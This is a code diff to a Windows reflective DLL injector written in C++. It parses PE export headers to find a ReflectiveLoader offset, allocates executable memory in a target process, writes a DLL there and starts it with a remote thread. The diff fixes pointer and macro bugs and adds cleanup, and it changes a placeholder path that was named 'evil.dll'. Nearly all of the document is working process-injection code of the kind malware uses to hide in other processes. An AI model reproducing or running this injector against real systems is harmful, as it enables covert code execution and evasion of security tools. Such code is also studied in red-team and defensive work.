@@ -1,7 +1,8 @@
 #include "Injector.hpp"
 
 DWORD Rva2Offset(DWORD dwRva, UINT_PTR uBaseAddr) {
-	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uBaseAddr;
+	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + pDosHeader->e_lfanew);
 	PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);
 	if (dwRva < pSecHeader[0].PointerToRawData) return dwRva;
 
@@ -18,15 +19,15 @@ DWORD Rva2Offset(DWORD dwRva, UINT_PTR uBaseAddr) {
 }
 
 DWORD GetFuncOffset(LPVOID lpBuffer, LPCSTR lpFuncName) {
-#ifdef WIN_X64
+#ifdef _WIN64
 	DWORD dwCompiledArch = 2;
 #else
 	DWORD dwCompiledArch = 1;
 #endif
 
 	UINT_PTR uBaseAddr = (UINT_PTR)lpBuffer;
-	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(uBaseAddr + (PIMAGE_DOS_HEADER)uBaseAddr);
-	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uBaseAddr;
+	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + pDosHeader->e_lfanew);
 
 	if (pNtHeaders->OptionalHeader.Magic == 0x010B) { // PE32
 		if (dwCompiledArch != 1) return 0;
@@ -62,9 +63,9 @@ DWORD GetFuncOffset(LPVOID lpBuffer, LPCSTR lpFuncName) {
 	return 0;
 }
 
-INT wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow) {
-	DWORD dwPid = 8148; // Replace it
-	WCHAR wDllPath[] = L"C:\\evil.dll"; // Replace it
+int main() {
+	DWORD dwPid = 14572; // Replace it
+	WCHAR wDllPath[] = L"C:\\ReflectiveDll.dll"; // Replace it
 
 	// --------------------------------------------
 	// Get file bytes
@@ -140,8 +141,11 @@ INT wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT n
 	LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, nullptr, dwFileSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!lpRemoteBuffer) return FALSE;
 
-	if (!WriteProcessMemory(hProcess, lpRemoteBuffer, lpBuffer, dwFileSize, nullptr))
+	if (!WriteProcessMemory(hProcess, lpRemoteBuffer, lpBuffer, dwFileSize, nullptr)) {
+		VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
+		CloseHandle(hProcess);
 		return FALSE;
+	}
 
 	LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteBuffer + dwReflectiveOffset);
 
@@ -150,9 +154,8 @@ INT wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT n
 		WaitForSingleObject(hThread, INFINITE);
 	}
 
-	VirtualFree(&lpRemoteBuffer, 0, MEM_RELEASE);
+	//VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
 	CloseHandle(hProcess);
-	CloseHandle(hThread);
 
 	return EXIT_SUCCESS;
 }
